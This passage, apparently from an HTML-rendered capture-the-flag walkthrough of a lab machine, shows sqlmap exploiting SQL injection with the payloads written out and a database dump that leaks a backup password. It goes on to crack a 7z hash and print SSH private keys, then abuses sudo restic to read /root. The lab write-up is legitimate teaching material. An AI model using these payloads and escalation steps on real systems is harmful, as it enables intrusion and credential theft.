[WARNING] reflective value(s) found and filtering out</span><br><span class="line">[12:30:12] [INFO] testing <span class="string">&#x27;OR boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[12:30:59] [INFO] testing <span class="string">&#x27;OR boolean-based blind - WHERE or HAVING clause (NOT)&#x27;</span></span><br><span class="line">[12:31:39] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)&#x27;</span></span><br><span class="line">[12:31:43] [INFO] GET parameter <span class="string">&#x27;q&#x27;</span> appears to be <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause (subquery - comment)&#x27;</span> injectable </span><br><span class="line">[12:31:43] [INFO] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[12:31:43] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line">[12:31:44] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span></span><br><span class="line">[12:31:44] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span></span><br><span class="line">[12:31:49] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span></span><br><span class="line">[12:31:50] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span></span><br><span class="line">[12:31:50] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;</span></span><br><span class="line">[12:31:51] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;</span></span><br><span class="line">[12:31:51] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;</span></span><br><span class="line">[12:31:51] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span></span><br><span class="line">[12:31:52] [INFO] GET parameter <span class="string">&#x27;q&#x27;</span> is <span class="string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span> injectable </span><br><span class="line">[12:31:52] [INFO] testing <span class="string">&#x27;MySQL inline queries&#x27;</span></span><br><span class="line">[12:31:52] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span></span><br><span class="line">[12:32:04] [INFO] GET parameter <span class="string">&#x27;q&#x27;</span> appears to be <span class="string">&#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span> injectable </span><br><span class="line">[12:32:04] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[12:32:16] [INFO] GET parameter <span class="string">&#x27;q&#x27;</span> appears to be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable </span><br><span class="line">[12:32:16] [INFO] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line">[12:32:16] [INFO] automatically extending ranges <span class="keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[12:32:17] [INFO] <span class="string">&#x27;ORDER BY&#x27;</span> technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range <span class="keyword">for</span> current UNION query injection technique <span class="built_in">test</span></span><br><span class="line">[12:32:19] [INFO] target URL appears to have 2 columns <span class="keyword">in</span> query</span><br><span class="line"><span class="keyword">do</span> you want to (re)try to find proper UNION column types with fuzzy <span class="built_in">test</span>? [y/N] N</span><br><span class="line">injection not exploitable with NULL values. Do you want to try with a random <span class="built_in">integer</span> value <span class="keyword">for</span> option <span class="string">&#x27;--union-char&#x27;</span>? [Y/n] Y</span><br><span class="line">[12:32:26] [WARNING] <span class="keyword">if</span> UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. <span class="string">&#x27;--dbms=mysql&#x27;</span>) </span><br><span class="line">[12:32:35] [INFO] target URL appears to be UNION injectable with 2 columns</span><br><span class="line">injection not exploitable with NULL values. Do you want to try with a random <span class="built_in">integer</span> value <span class="keyword">for</span> option <span class="string">&#x27;--union-char&#x27;</span>? [Y/n] Y</span><br><span class="line">[12:32:45] [INFO] testing <span class="string">&#x27;Generic UNION query (10) - 21 to 40 columns&#x27;</span></span><br><span class="line">[12:32:54] [INFO] testing <span class="string">&#x27;Generic UNION query (10) - 41 to 60 columns&#x27;</span></span><br><span class="line">[12:33:12] [INFO] testing <span class="string">&#x27;Generic UNION query (10) - 61 to 80 columns&#x27;</span></span><br><span class="line">[12:36:53] [INFO] testing <span class="string">&#x27;Generic UNION query (10) - 81 to 100 columns&#x27;</span></span><br><span class="line">[12:37:01] [INFO] testing <span class="string">&#x27;MySQL UNION query (20) - 1 to 20 columns&#x27;</span></span><br><span class="line">[12:37:13] [INFO] testing <span class="string">&#x27;MySQL UNION query (10) - 21 to 40 columns&#x27;</span></span><br><span class="line">[12:38:42] [INFO] testing <span class="string">&#x27;MySQL UNION query (10) - 41 to 60 columns&#x27;</span></span><br><span class="line">[12:40:59] [INFO] testing <span class="string">&#x27;MySQL UNION query (10) - 61 to 80 columns&#x27;</span></span><br><span class="line">[12:41:08] [INFO] testing <span class="string">&#x27;MySQL UNION query (10) - 81 to 100 columns&#x27;</span></span><br><span class="line">GET parameter <span class="string">&#x27;q&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="keyword">if</span> any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 1565 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: q (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span><br><span class="line">    Payload: q=<span class="built_in">test</span><span class="string">&quot; AND 6979=(SELECT (CASE WHEN (6979=6979) THEN 6979 ELSE (SELECT 8267 UNION SELECT 3305) END))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: q=test&quot;</span> AND (SELECT 8266 FROM(SELECT COUNT(*),CONCAT(0x7171707a71,(SELECT (ELT(8266=8266,1))),0x716a706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EhMa</span><br><span class="line"></span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 stacked queries (comment)</span><br><span class="line">    Payload: q=<span class="built_in">test</span><span class="string">&quot;;SELECT SLEEP(5)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: q=test&quot;</span> AND (SELECT 4519 FROM (SELECT(SLEEP(5)))yRql)-- yGPS</span><br><span class="line">---</span><br><span class="line">[12:43:49] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[12:43:51] [INFO] fetching database names</span><br><span class="line">[12:43:51] [INFO] retrieved: <span class="string">&#x27;information_schema&#x27;</span></span><br><span class="line">[12:43:52] [INFO] retrieved: <span class="string">&#x27;phishing&#x27;</span></span><br><span class="line">[12:43:52] [INFO] retrieved: <span class="string">&#x27;temp&#x27;</span></span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] phishing</span><br><span class="line">[*] temp</span><br><span class="line"></span><br><span class="line">[12:43:52] [INFO] fetched data logged to text files under <span class="string">&#x27;/home/kali/.local/share/sqlmap/output/127.0.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 12:43:52 /2025-04-07/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sqlmap</span> -u <span class="string">&#x27;http://127.0.0.1:5000/?q=test&#x27;</span> -p q --level 5 --risk 3 --batch --dump -D temp</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                    </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.8.11<span class="comment">#stable&#125;                                                                                       </span></span><br><span class="line">|_ -| . [)]     | .<span class="string">&#x27;| . |                                                                                                       </span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                                                       </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                    </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 12:53:58 /2025-04-07/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[12:53:59] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[12:53:59] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: q (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span></span><br><span class="line"><span class="string">    Payload: q=test&quot; AND 6979=(SELECT (CASE WHEN (6979=6979) THEN 6979 ELSE (SELECT 8267 UNION SELECT 3305) END))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: q=test&quot; AND (SELECT 8266 FROM(SELECT COUNT(*),CONCAT(0x7171707a71,(SELECT (ELT(8266=8266,1))),0x716a706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EhMa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: stacked queries</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 stacked queries (comment)</span></span><br><span class="line"><span class="string">    Payload: q=test&quot;;SELECT SLEEP(5)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: q=test&quot; AND (SELECT 4519 FROM (SELECT(SLEEP(5)))yRql)-- yGPS</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[12:53:59] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[12:53:59] [INFO] fetching tables for database: &#x27;</span>temp<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:53:59] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[12:54:00] [INFO] retrieved: &#x27;</span>command_log<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:00] [INFO] fetching columns for table &#x27;</span>command_log<span class="string">&#x27; in database &#x27;</span>temp<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:00] [INFO] retrieved: &#x27;</span><span class="built_in">id</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:01] [INFO] retrieved: &#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:01] [INFO] retrieved: &#x27;</span><span class="built_in">command</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:02] [INFO] retrieved: &#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:02] [INFO] retrieved: &#x27;</span><span class="built_in">date</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:05] [INFO] retrieved: &#x27;</span>timestamp<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:05] [INFO] fetching entries for table &#x27;</span>command_log<span class="string">&#x27; in database &#x27;</span>temp<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:06] [INFO] retrieved: &#x27;</span>2024-08-30 10:44:01<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:06] [INFO] retrieved: &#x27;</span><span class="built_in">uname</span> -a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:09] [INFO] retrieved: &#x27;</span>1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:09] [INFO] retrieved: &#x27;</span>2024-08-30 11:58:05<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:10] [INFO] retrieved: &#x27;</span>restic init --repo rest:http://75951e6ff.whiterabbit.htb<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:10] [INFO] retrieved: &#x27;</span>2<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:13] [INFO] retrieved: &#x27;</span>2024-08-30 11:58:36<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:13] [INFO] retrieved: &#x27;</span><span class="built_in">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:14] [INFO] retrieved: &#x27;</span>3<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:16] [INFO] retrieved: &#x27;</span>2024-08-30 11:59:02<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:16] [INFO] retrieved: &#x27;</span><span class="built_in">rm</span> -rf .bash_history <span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:17] [INFO] retrieved: &#x27;</span>4<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:17] [INFO] retrieved: &#x27;</span>2024-08-30 11:59:47<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[12:54:19] [INFO] retrieved: &#x27;</span><span class="comment">#thatwasclose&#x27;</span></span><br><span class="line">[12:54:20] [INFO] retrieved: <span class="string">&#x27;5&#x27;</span></span><br><span class="line">[12:54:20] [INFO] retrieved: <span class="string">&#x27;2024-08-30 14:40:42&#x27;</span></span><br><span class="line">[12:54:21] [INFO] retrieved: <span class="string">&#x27;cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd&#x27;</span></span><br><span class="line">[12:54:23] [INFO] retrieved: <span class="string">&#x27;6&#x27;</span></span><br><span class="line">Database: temp</span><br><span class="line">Table: command_log</span><br><span class="line">[6 entries]</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | <span class="built_in">date</span>                | <span class="built_in">command</span>                                                                      |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| 1  | 2024-08-30 10:44:01 | <span class="built_in">uname</span> -a                                                                     |</span><br><span class="line">| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |</span><br><span class="line">| 3  | 2024-08-30 11:58:36 | <span class="built_in">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd                       |</span><br><span class="line">| 4  | 2024-08-30 11:59:02 | <span class="built_in">rm</span> -rf .bash_history                                                         |</span><br><span class="line">| 5  | 2024-08-30 11:59:47 | <span class="comment">#thatwasclose                                                                |</span></span><br><span class="line">| 6  | 2024-08-30 14:40:42 | <span class="built_in">cd</span> /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[12:54:23] [INFO] table <span class="string">&#x27;temp.command_log&#x27;</span> dumped to CSV file <span class="string">&#x27;/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/temp/command_log.csv&#x27;</span>                                                                                                                       </span><br><span class="line">[12:54:23] [INFO] fetched data logged to text files under <span class="string">&#x27;/home/kali/.local/share/sqlmap/output/127.0.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 12:54:23 /2025-04-07/</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we will use the obtained data to retrieve the restic data, get the hash, crack it, and later get the ssh private key:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd</span><br><span class="line">                                                                                                                                </span><br><span class="line">$ restic restore latest --target ./restored_data --repo rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd</span><br><span class="line">repository 5b26a938 opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /home/kali/.cache/restic</span><br><span class="line">[0:00] 100.00%  5 / 5 index files loaded</span><br><span class="line">restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to ./restored_data</span><br><span class="line">Summary: Restored 5 files/dirs (572 B) <span class="keyword">in</span> 0:00</span><br><span class="line">                                                </span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span>                        </span><br><span class="line">/home/kali/restored_data/dev/shm/bob/ssh</span><br><span class="line">                                                                                                                                </span><br><span class="line">$ 7z2john bob.7z &gt; <span class="built_in">hash</span></span><br><span class="line">ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes</span><br><span class="line">                                                                                                                                </span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">hash</span>           </span><br><span class="line">bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399<span class="variable">$00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ john -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])</span><br><span class="line">Cost 1 (iteration count) is 524288 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (padding size) is 3 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 3 (compression <span class="built_in">type</span>) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 4 (data length) is 365 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:03:38 0.13% (ETA: 2025-04-09 12:47) 0g/s 100.6p/s 100.6c/s 100.6C/s lovers123..kokito</span><br><span class="line">1q2w3e4r5t6y     (bob.7z)     </span><br><span class="line">1g 0:00:03:56 DONE (2025-04-07 13:10) 0.004234g/s 100.9p/s 100.9c/s 100.9C/s 200200..150390</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                </span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bob  bob.pub  config</span><br><span class="line">                                                                                                                                </span><br><span class="line">$ <span class="built_in">cat</span> *   </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC</span><br><span class="line">VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w</span><br><span class="line">AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE</span><br><span class="line">FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy</span><br><span class="line">Host whiterabbit</span><br><span class="line">  HostName whiterabbit.htb</span><br><span class="line">  Port 2222</span><br><span class="line">  User bob</span><br><span class="line">             </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<p>Once we are in, we will abuse restic again to get the morpheus ssh key:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">ob@ebdce80611e9:~$ sudo restic init --repo /tmp/kujen</span><br><span class="line">enter password <span class="keyword">for</span> new repository: </span><br><span class="line">enter password again: </span><br><span class="line">created restic repository 42daf6fb10 at /tmp/kujen</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br><span class="line">bob@ebdce80611e9:~$ sudo restic -r /tmp/kujen/ backup /root</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 42daf6fb opened (version 2, compression level auto)</span><br><span class="line">created new cache <span class="keyword">in</span> /root/.cache/restic</span><br><span class="line">no parent snapshot found, will <span class="built_in">read</span> all files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Files:           4 new,     0 changed,     0 unmodified</span><br><span class="line">Dirs:            3 new,     0 changed,     0 unmodified</span><br><span class="line">Added to the repository: 6.493 KiB (3.603 KiB stored)</span><br><span class="line"></span><br><span class="line">processed 4 files, 3.865 KiB <span class="keyword">in</span> 0:00</span><br><span class="line">snapshot 8facbebd saved</span><br><span class="line">bob@ebdce80611e9:~$ sudo restic -r /tmp/kujen/ <span class="built_in">ls</span> latest</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 42daf6fb opened (version 2, compression level auto)</span><br><span class="line">[0:00] 100.00%  1 / 1 index files loaded</span><br><span class="line">snapshot 8facbebd of [/root] filtered by [] at 2025-04-07 17:14:02.802882091 +0000 UTC):</span><br><span class="line">/root</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.cache</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh</span><br><span class="line">/root/morpheus</span><br><span class="line">/root/morpheus.pub</span><br><span class="line">bob@ebdce80611e9:~$ sudo restic -r /tmp/kujen/ dump latest /root/morpheus</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 42daf6fb opened (version 2, compression level auto)</span><br><span class="line">[0:00] 100.00%  1 / 1 index files loaded</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS</span><br><span class="line">1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP</span><br><span class="line">UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx</span><br><span class="line">K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w</span><br><span class="line">Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR</span><br><span class="line">4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp</span><br><span class="line">c3QBAg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ ssh morpheus@whiterabbit.htb -i morpheus </span><br><span class="line">The authenticity of host <span class="string">&#x27;whiterabbit.htb (10.129.25.169)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:F9XNz/rgt655Q1XKkL6at11Zy5IXAogAEH95INEOrIE.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>whiterabbit.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span></span><br><span 